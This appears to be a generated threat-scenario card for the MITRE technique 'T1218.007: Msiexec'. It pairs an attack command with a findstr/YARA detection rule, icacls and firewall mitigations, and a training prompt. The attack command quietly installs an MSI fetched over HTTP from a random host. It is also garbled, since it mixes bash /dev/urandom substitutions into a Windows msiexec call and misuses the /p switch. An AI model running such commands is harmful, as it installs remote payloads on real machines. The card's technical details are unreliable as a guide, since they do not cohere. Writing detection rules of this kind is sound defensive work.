---
type: campaign
scenario_id: 370
tactic: Defense Evasion
technique: "T1218.007: Msiexec"
technique_id: T1218.007
tags: [campaign, lotl, defense_evasion]
---

# Using msiexec to install DNS tunneling MSI package.

## Threat Description
Using msiexec to install DNS tunneling MSI package.

## Attack Command
```
msiexec /quiet /i http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor msiexec HTTP: `wmic process where name='msiexec.exe' get commandline | findstr http`; YARA rule: `rule MsiexecDnsTunnel { strings: $a = /msiexec.*http.*msi/ nocase; condition: $a }`.

## Mitigation
Restrict msiexec: `icacls %windir%\System32\msiexec.exe /deny Everyone:RX`; Block MSI downloads: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\System32\msiexec.exe' action=block`.

## AI Training Prompt
Train AI to detect msiexec-based DNS tunneling MSI installations by analyzing HTTP downloads, msiexec command-line arguments, and DNS query patterns; suggest MSI download restrictions.

## References
- MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
